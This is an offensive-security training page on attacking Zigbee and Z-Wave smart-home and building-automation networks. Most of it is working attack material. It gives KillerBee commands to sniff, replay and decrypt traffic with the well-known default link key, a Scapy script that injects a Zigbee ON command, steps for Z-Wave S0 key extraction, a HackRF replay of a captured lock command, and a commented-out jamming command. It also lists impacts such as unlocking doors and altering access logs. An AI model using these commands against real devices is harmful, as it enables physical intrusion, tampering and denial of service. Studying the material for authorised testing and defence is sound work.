---
layout: training-page
title: "Zigbee & Z-Wave Attacks — Red Team Academy"
module: "Wireless"
tags:
  - zigbee
  - zwave
  - iot
  - wireless
  - killerbee
  - smart-home
page_key: "wireless-zigbee-zwave"
render_with_liquid: false
---

# Zigbee & Z-Wave Attacks

Zigbee and Z-Wave are low-power mesh protocols used in smart home devices, building automation, industrial sensors, and access control systems. Both operate below Wi-Fi in the 2.4 GHz / 900 MHz bands and are commonly deployed in corporate and residential environments with minimal security consideration.

## Zigbee Overview

```
Frequency:  2.4 GHz (channels 11–26) worldwide; also 868/915 MHz
Range:      10–100 meters per hop; mesh extends range
Speed:      250 kbps
Devices:    Smart bulbs, locks, thermostats, sensors, industrial controllers
Protocol:   IEEE 802.15.4 at PHY/MAC layer; Zigbee above that
Security:   AES-128 encryption (when properly configured); often misconfigured

Network roles:
  Coordinator — forms network, holds network key
  Router      — routes traffic between devices
  End Device  — leaf node (sensor, bulb, etc.)

Key vulnerability: Many devices use a default/hardcoded "Trust Center Link Key"
  of 0x5A6967426565416C6C69616E63653039 ("ZigBeeAlliance09")
  This is the global pre-configured link key used for joining
```

## Hardware for Zigbee

```
Recommended hardware:
  ApiMote v4    — purpose-built Zigbee sniffer; works with KillerBee
  RZUSBSTICK    — Atmel USB stick; supported by KillerBee
  CC2531        — TI chip; ~$5 on AliExpress; flash with Wireshark firmware
  HackRF + GNU Radio — Zigbee receive with gr-ieee802-15-4

# Flash CC2531 for Wireshark sniffing:
# Requires CC Debugger hardware + SmartRF Flash Programmer
# Flash: sniffer_fw_cc2531.hex
# Then: add as interface in Wireshark → use Zigbee dissector
```

## KillerBee — Zigbee Attack Toolkit

```bash
# KillerBee — Zigbee security assessment framework
# github.com/riverloopsec/killerbee
pip install killerbee

# List available interfaces
zbid

# Scan for Zigbee networks (channel hop)
zbdsniff -c 11  # channel 11
for c in $(seq 11 26); do zbdsniff -c $c -t 5; done  # scan all channels

# Capture all traffic on a channel
zbdump -c 15 -w capture.pcap

# Replay captured packets
zbreplay -c 15 -r capture.pcap

# Enumerate network topology
zbfind

# Decrypt captured traffic (if key is known)
zbdecrypt -p capture.pcap -k ZigBeeAlliance09 -w decrypted.pcap
# Or with the default key hex:
zbdecrypt -p capture.pcap \
  -K 5A6967426565416C6C69616E63653039 -w decrypted.pcap

# Open decrypted PCAP in Wireshark → filter: zbee_nwk or zbee_zcl
```

## Zigbee Key Extraction Attacks

```bash
# Attack 1: Capture the join process — key transmitted during device join
# The coordinator sends the network key to new devices using the trust center link key
# If you capture a device joining and know the trust center link key (often default):

# 1. Monitor Zigbee traffic on all channels
zbdump -c 15 -w capture.pcap

# 2. Reset a device (or wait for one to join)
# The join procedure sends encrypted key exchange — capture it

# 3. Decrypt with known trust center link key
zbdecrypt -p capture.pcap -K 5A6967426565416C6C69616E63653039 -w dec.pcap

# If successful, the decrypted traffic reveals the actual network key
# All subsequent traffic can be decrypted

# Attack 2: Touchlink commissioning — proximity-based key extraction
# Some Zigbee devices support Touchlink: factory reset + re-pair via proximity
# An attacker can force reset + become the new coordinator
zbcat -c 15 -f touchlink  # experimental
```

## Zigbee Device Control

```bash
# Once network key is known, inject commands to control devices

# ZBReplay — replay command to toggle a light/lock
zbreplay -c 15 -r lock_toggle.pcap

# Zbgoodfind — enumerate and interact with Zigbee devices
# github.com/nccgroup/zbgoodfind

# Scapy with dot15d4 extension
pip install scapy
python3 << 'EOF'
from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *
from scapy.all import *

# Craft Zigbee ON command to a light
pkt = (Dot15d4FCS() /
       Dot15d4Data() /
       ZigbeeNWK() /
       ZigbeeSecurityHeader() /
       ZigbeeAppDataPayload() /
       ZCLGeneralCommandFrame(command_identifier=0x01))  # 0x01 = ON

sendp(pkt, iface="zigbee0")
EOF
```

## Z-Wave Overview

```
Frequency:  908.42 MHz (US), 868.42 MHz (EU), 916 MHz (AU)
Range:      30 meters typical; mesh extends range
Speed:      9.6–100 kbps
Devices:    Door locks, garage doors, thermostats, power outlets
Security:
  S0 (legacy)  — single key, transmitted in plaintext during inclusion
  S2 (current) — Diffie-Hellman key exchange; much stronger
  Devices still default to no security if controller doesn't enforce S2
```

## Hardware for Z-Wave

```
Sigma Designs UZB7 — USB Z-Wave controller (~$30)
Zooz ZAC93         — Z-Wave USB stick
HackRF + gr-zwave  — passive reception with GNU Radio

# gr-zwave — Z-Wave GNU Radio module
# github.com/baol/gr-zwave
# Enables passive Z-Wave traffic capture without dedicated hardware
```

## Z-Wave S0 Attack — Key Extraction

```bash
# Z-Wave S0 sends the network key encrypted with a default key (all zeros)
# An attacker sniffing the inclusion (pairing) process can decrypt it

# 1. Sniff with gr-zwave (HackRF)
# GNU Radio Companion → load zwave_rx.grc flow graph
# or use Z-Wave packet sniffer firmware on UZB7

# 2. Capture inclusion of a new device:
# Include a device to the hub while sniffing
# The S0 key exchange happens — key sent with static encryption

# 3. Decrypt with Z-Wave PC Controller software or custom tooling
# The S0 network key is: AES-128 encrypted with key 0x00*16
# python-z-wave-dissector or OZW (OpenZWave) can parse and decrypt

# 4. With the S0 network key, decrypt all subsequent S0 traffic
# S2 is resistant to this — proper S2 uses ECDH
```

## Z-Wave Replay & Jamming

```bash
# Z-Wave replay — capture and retransmit commands
# Works if sequence numbers aren't strictly enforced
# Common against simple on/off commands to outlets and locks

# Replay with HackRF
hackrf_transfer -r zwave_lock.bin -f 908420000 -s 2000000 -x 47

# Z-Wave jam (denial of service)
# GNU Radio → continuous tone at 908.42 MHz
# Disrupts all Z-Wave communication in range
# hackrf_transfer -t /dev/zero -f 908420000 -s 2000000 -x 40
# NOTE: jamming may be illegal — use only in authorized lab environments
```

## Building Automation Exploitation

```bash
# Zigbee and Z-Wave are common in:
# - Smart building HVAC and lighting control
# - Industrial sensor networks
# - Retail self-checkout systems
# - Hotel room control systems
# - Medical device sensors

# Attack impact in corporate environment:
# - Unlock Zigbee-controlled door locks
# - Manipulate access logs on Zigbee-connected panels
# - Replay HVAC commands to affect physical environment
# - Intercept sensor data (temperature, occupancy, power usage)

# Reconnaissance: walk building perimeter with Zigbee sniffer
# Any active Zigbee coordinator on channels 11-26 is visible to zbdsniff
zbdsniff -c 15 -t 30  # 30 seconds on channel 15
```

## Resources

- KillerBee — `github.com/riverloopsec/killerbee`
- gr-ieee802-15-4 — `github.com/bastibl/gr-ieee802-15-4`
- gr-zwave — `github.com/baol/gr-zwave`
- Zigbee Alliance specs — `zigbeealliance.org`
- Z-Wave Alliance specs — `z-wavealliance.org`
- Zigbee/Z-Wave security research — Black Hat, DEF CON IoT Village
